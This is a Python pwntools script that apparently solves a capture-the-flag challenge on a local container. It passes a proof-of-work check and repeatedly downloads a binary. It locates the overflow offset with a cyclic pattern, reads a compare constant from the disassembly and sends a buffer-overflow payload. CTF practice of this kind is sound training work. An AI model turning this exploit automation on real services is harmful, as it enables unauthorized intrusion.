import re
import os
import string
import proofofwork
from pwn import *

seq = cyclic(0x200)

context.log_level = 'debug'
r = remote('172.17.0.2', 9300)

def chunks(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]

def de_bruijn(k, n):
    try:
        _ = int(k)
        alphabet = list(map(str, range(k)))
    except (ValueError, TypeError):
        alphabet = k
        k = len(k)

    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return ''.join(alphabet[i] for i in sequence)

def cyclic(arg):
    from itertools import islice
    return ''.join(islice(de_bruijn(string.ascii_lowercase, 4), int(arg)+1))

def find_cyclic(arg):
    return de_bruijn(string.ascii_lowercase, 4).find(arg)

def find_offset():
    p = process("./target-bin")
    p.sendline(seq)
    modified = p.recvline().strip()
    search = ''.join([chr(int(i, 16)) for i in chunks(modified, 2)])
    return find_cyclic(search[::-1])

def find_target():
    elf = ELF("./target-bin")
    target_regex = r'^.*cmp    eax,0x(.*)$'
    main_len = elf.symbols.__libc_csu_init - elf.symbols.main
    for i in elf.disasm(elf.symbols.main, main_len).split("\n"):
        m = re.match(target_regex, i)
        if m: return int(m.group(1), 16)
    return -1

def get_binary():
    with open("target-bin", "wb+") as f:
        while True:
            data = r.recv(4096)
            f.write(data)
            if len(data) < 4096:
                break
    os.chmod("./target-bin", 0777)

def exploit(offset, target):
    r.sendline("A"*offset + p64(target))

def get_pow():
    s = r.recvline()
    target = s.strip().split(" ")[-1]
    r.sendline(proofofwork.sha256(target))

get_pow()

for i in range(0, 5):
    get_binary()
    offset = find_offset()
    target = find_target()
    exploit(offset, target)

r.interactive()
